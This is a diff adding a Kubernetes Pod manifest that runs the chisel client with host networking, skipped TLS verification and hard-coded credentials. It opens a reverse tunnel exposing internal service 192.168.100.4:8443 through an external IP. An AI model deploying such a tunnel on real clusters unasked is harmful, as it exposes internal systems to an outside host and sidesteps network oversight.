@@ -1,0 +1,22 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: chisel
+spec:
+  hostNetwork: true
+  restartPolicy: Never
+  containers:
+    - name: chisel
+      image: jpillora/chisel
+      args:
+        - client
+        - --tls-skip-verify
+        - --auth
+        - MprvmMqhZuFRuQD8N6QTfPzfAsGJZqg2:vCf8EPJzghSt7uxVa2K2NJLnaLQY8YGb
+        - https://200.133.59.82:443/chisel-tunnel
+        - R:0.0.0.0:30018:192.168.100.4:8443
+      stdin: true
+      tty: true
+      ports:
+        - name: tunnel
+          containerPort: 30018
